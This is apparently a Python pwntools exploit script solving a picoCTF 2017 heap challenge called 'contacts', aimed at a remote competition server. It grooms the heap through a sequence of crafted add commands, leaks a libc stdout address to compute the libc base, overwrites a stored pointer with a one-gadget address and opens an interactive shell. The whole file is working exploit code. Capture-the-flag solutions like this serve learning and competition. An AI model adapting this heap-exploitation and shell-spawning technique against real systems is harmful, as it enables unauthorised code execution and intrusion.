from pwn import *
import time

lib = ELF("./libc.so.6")
# r = remote("127.0.0.1",1337)
#for z in range(40):
#r = process("./contacts")
#lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
r = remote("shell2017.picoctf.com",29018)

a = """ Three operations:
    1) Add new that matches none => immediate malloc then free
    2) Add new that matches but fails => malloc(new) free(old) free(new)
    3) Add new that matches perfectly =>malloc(new) free(old)
    """

for x in range(0x40-4):
    r.sendline("add " + str(x + 100) + " asdf " + "1234567890")
    r.interactive
r.sendline("add 1 one 1234567890")
r.sendline("add 2 two 1234567890")
r.sendline("add 3 three 1234567890")
r.sendline("add 1 one 1234567890")
r.sendline("add 3 three 123")
r.sendline("add 1 one 1234567890")
r.sendline("add 2 two 123456")
r.sendline("add 0 three 1234567890")
r.sendline("add " + str(0x00601F40 + 510*8 ) + " asdf 1234567890")
r.sendline("add 1338 asdf 1234567890")
r.sendline("add " + "1337" + " asdf 1234567890")
r.sendline("add 1234 " + "a"*24 + " 1234567890")
raw_input()
time.sleep(1)
r.recv(10000)
r.sendline("get 1234")
time.sleep(1)
a = r.recvline()
name = a.split(" ")[1]
a = a.replace("a"*24,"").replace("1234: ","").replace(" 1234567890","")[::-1].encode("hex").replace("0a","")
#0x41319
stdout = int(a ,16)
libc_base = stdout - lib.symbols["_IO_2_1_stdout_"]
print hex(libc_base)
shell = libc_base + 0x41374#0x46421  
print hex(shell)
r.sendline("update-id " +name + " " + str(shell))

r.interactive()


